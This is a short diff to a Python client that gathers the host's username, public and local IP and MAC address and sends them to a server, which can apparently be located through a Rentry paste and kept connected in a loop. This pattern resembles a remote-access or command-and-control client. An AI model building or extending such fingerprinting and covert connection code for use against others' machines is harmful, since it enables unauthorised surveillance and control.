@@ -1,21 +1,24 @@
 import requests, socket
-import getpass, uuid, pickle, time
+import getpass, uuid
 
 from typing import Optional
 from loguru import logger
 
 from core.rentry import Rentry
-from core.client.connect import Connect
 from core.enums import PacketType
+
+import core.client as Client
 
 DEFAULT_SERVER_ADDRESS: str = "localhost:5000"  # Default bind address
 
 deviceInformation: dict = {
     # Information about the client device. This includes its unique identifier, username, public IP, and local IP.
-    "Windows_UUID": str(uuid.uuid1()),
     "Username": getpass.getuser(),
+
     "Public_IP": requests.get("https://api.ipify.org").text,
     "Local_IP": socket.gethostbyname(socket.gethostname()),
+    "MAC_Address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
+        for elements in range(0, 2 * 6, 2)][::-1])
 }
 
 
@@ -45,7 +48,7 @@ def main(addr: Optional[str] = None, useRentry: bool = False) -> None:
 
     # Put this code below to infinite loop in order to keep the connection to the server
 
-    connection: Connect = Connect(serverAddress, deviceInformation)
+    connection: Client.Connect = Client.Connect(serverAddress, deviceInformation)
     connection.useRentry = useRentry
     connection.connect_()
 
